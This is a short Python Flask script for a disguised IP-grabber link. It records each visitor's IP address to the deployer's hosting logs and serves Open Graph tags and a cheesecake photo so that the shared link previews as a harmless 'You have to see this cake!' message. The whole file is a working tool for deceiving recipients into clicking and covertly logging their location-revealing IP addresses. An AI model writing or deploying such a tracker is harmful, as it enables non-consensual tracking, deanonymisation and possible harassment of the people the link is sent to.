from flask import Flask, request

app = Flask(__name__)

@app.route('/')
def logger():
    # 1. This logs their IP to your Vercel dashboard
    user_ip = request.headers.get('x-forwarded-for', request.remote_addr)
    print(f"!!! LOGGED IP: {user_ip}")

    # 2. This creates the "Cake" preview when you send the link
    return f'''
    <!DOCTYPE html>
    <html>
    <head>
        <meta property="og:title" content="You have to see this cake!">
        <meta property="og:description" content="I'm making this for the weekend.">
        <meta property="og:image" content="https://www.lifeloveandsugar.com/wp-content/uploads/2014/06/Strawberry-Shortcake-Cheesecake3.jpg">
        <meta property="og:type" content="website">
        <meta property="og:image:width" content="1200">
        <meta property="og:image:height" content="630">
    </head>
    <body>
        <img src="https://www.lifeloveandsugar.com/wp-content/uploads/2014/06/Strawberry-Shortcake-Cheesecake3.jpg" style="width:100%;">
    </body>
    </html>
    '''
  
